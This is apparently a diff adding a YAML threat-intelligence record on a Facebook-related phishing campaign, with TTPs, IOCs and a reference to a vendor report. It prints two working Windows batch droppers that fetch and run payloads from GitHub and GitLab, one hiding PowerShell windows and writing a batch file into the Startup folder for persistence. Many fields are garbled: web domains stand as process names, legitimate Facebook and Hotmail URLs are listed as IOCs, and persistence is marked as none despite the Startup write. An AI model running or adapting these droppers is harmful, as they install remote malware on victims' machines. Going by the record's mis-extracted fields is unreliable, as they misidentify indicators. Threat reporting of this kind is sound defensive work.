@@ -1,0 +1,76 @@
+description: This report details tactics, techniques, and procedures (TTPs) associated
+  with a phishing campaign targeting ThiLienBankHos users, likely aimed at account
+  compromise and credential theft.
+attribution: Unknown
+TTPs:
+  processes:
+  - facebook.exe
+  - hotmail.com
+  commandline:
+  - "@echo off
+    cls
+    set URL=https://github[.]com/xjnhzaj12b1/iscsicpl_bypassUAC/raw/main/4duong2.zip
+    set ZIP_PATH=C:\Users\Public\myFile.zip
+    set DESTINATION_FOLDER=C:\Users\Public
+    curl -L -o \"%ZIP_PATH%\" \"%URL%\"
+    powershell -command \"Expand-Archive -LiteralPath '%ZIP_PATH%' -DestinationPath '%DESTINATION_FOLDER%'\"
+    del \"%ZIP_PATH%\"
+    call \"%DESTINATION_FOLDER%\vn.cmd\"
+    del \"%DESTINATION_FOLDER%\vn.cmd\"
+    exit"
+  - "@echo off
+    set dQ=u
+    set UA=P
+    setlocal EnableDelayedExpansion
+    set Og=:
+    set Uw=S
+    [..]
+    [..]
+    [..]
+    set dw=w
+    set XQ=]
+    set XA=\
+    cls
+    start chrome https://www.alibaba.com/
+    C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden Invoke-WebRequest -URI https://gitlab.com/xjnhzaj12b2/home/-/raw/master/st  -OutFile \"C:\\Users\\$([Environment]::UserName)\\AppData\\Roaming\\Microsoft\\Windows\\'Start Menu'\\Programs\\Startup\\WindowsSecure.bat\";
+    C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden Invoke-WebRequest -URI https://gitlab.com/xjnhzaj12b2/home/-/raw/master/Document.zip -OutFile C:\\Users\\Public\\Document.zip;
+    C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden Expand-Archive C:\\Users\\Public\\Document.zip -DestinationPath C:\\Users\\Public\\Document;
+    C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden Invoke-WebRequest -URI https://gitlab.com/xjnhzaj12b2/home/-/raw/master/achung3 -OutFile C:\\Users\\Public\\Document\\project.py;
+    C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden C:\\Users\\Public\\Document\\python C:\\Users\\Public\\Document\\project.py;
+    start chrome https://www.alibaba.com/"
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - executable: facebook.exe
+    destination: mbasic.facebook.com
+  - executable: www.facebook.com
+    destination: www.facebook.com/hacked
+  - executable: v.facebook.com
+    destination: v.facebook.com/ihacked
+  - executable: www.facebook.com
+    destination: www.facebook.com/settings?tab=securityletdie old cookies
+  - executable: hotmail.com
+    destination: hotmail.com
+  - executable: www.facebook.com
+    destination: www.facebook.com/privacylreview/review_id=573933453011861
+  - executable: www.facebook.com
+    destination: www.facebook.com/privacylreview!review_id=573933453011881
+  file_activity: []
+  persistence:
+  - None explicitly mentioned.
+  pipes: []
+  process_relations: []
+IOCs:
+- mbasic.facebook.com
+- www.facebook.com/hacked
+- v.facebook.com/ihacked
+- www.facebook.com/settings?tab=securityletdie old cookies
+- hotmail.com
+- www.facebook.com/privacylreview/review_id=573933453011861
+- www.facebook.com/privacylreview!review_id=573933453011881
+authors:
+- Oleg Zaytsev
+reference: https://guard.io/labs/mrtonyscam-botnet-of-facebook-users-launch-high-intent-messenger-phishing-attack-on-business
+date_of_publication: June 23, 2025
+file_creation_date: June 23, 2025
